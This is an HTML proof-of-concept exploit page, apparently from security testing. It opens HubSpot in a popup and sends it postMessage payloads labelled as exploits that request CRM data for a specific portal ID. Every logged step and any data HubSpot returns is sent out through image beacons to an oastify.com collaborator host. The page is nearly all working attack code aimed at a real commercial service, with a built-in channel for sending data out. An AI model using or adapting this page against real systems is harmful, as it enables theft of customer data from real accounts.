<!DOCTYPE html>
<html>
<head><title>Loading</title></head>
<body>
<h1>Processing...</h1>
<div id="log"></div>
<script>
const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(m) {
    document.getElementById('log').innerHTML += '<br>' + m;
    new Image().src = E + '/?log=' + encodeURIComponent(m);
}

log('page_loaded');

// Create sandboxed iframe (this makes origin = null)
const iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts allow-popups allow-same-origin';
iframe.style.cssText = 'width:100%;height:500px;border:2px solid red';

iframe.srcdoc = `
<!DOCTYPE html>
<html>
<body>
<h2>Sandbox Active</h2>
<div id="status"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(m) {
    document.getElementById('status').innerHTML += '<br>' + m;
    new Image().src = EXFIL + '/?s=' + encodeURIComponent(m);
}

log('START_origin=' + window.origin);

log('opening_hubspot');
let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=800,height=600');

if (!hub) {
    log('popup_blocked');
} else {
    log('popup_opened');
    
    let attempts = 0;
    let checker = setInterval(() => {
        attempts++;
        
        try {
            hub.origin;
            if (attempts % 10 === 0) log('waiting_' + attempts);
        } catch(e) {
            clearInterval(checker);
            log('hubspot_loaded_after_' + attempts);
            
            // Listen for responses from HubSpot
            window.addEventListener('message', (resp) => {
                if (resp.source === hub) {
                    log('RESPONSE_from_hubspot');
                    const data = JSON.stringify(resp.data).substring(0, 400);
                    log('response_data=' + data);
                    new Image().src = EXFIL + '/?response=' + encodeURIComponent(data);
                }
            });
            
            // Send exploits
            setTimeout(() => {
                log('sending_exploit_1');
                hub.postMessage({
                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                    commandId: 'getdata',
                    featureId: 'crm',
                    parameters: {portalId: '46962361'},
                    resultCount: 100,
                    language: 'en',
                    objectId: '46962361',
                    applicationId: 'crm',
                    basePath: '/crm',
                    maxPollingAttempts: 5,
                    pollingInterval: 200
                }, '*');
            }, 1000);
            
            setTimeout(() => {
                log('sending_exploit_2');
                hub.postMessage({
                    type: 'raw',
                    _callbackId: 'exploit_' + Date.now(),
                    body: {
                        action: 'getData',
                        portalId: '46962361'
                    }
                }, '*');
            }, 2000);
            
            setTimeout(() => {
                log('sending_exploit_3');
                hub.postMessage({
                    type: 'TOGGLE_DARK_MODE',
                    isDarkMode: true
                }, '*');
            }, 3000);
        }
        
        if (attempts > 100) {
            clearInterval(checker);
            log('timeout_after_100');
        }
    }, 100);
}
</script>
</body>
</html>
`;

document.body.appendChild(iframe);
log('sandbox_created');
</script>
</body>
</html>
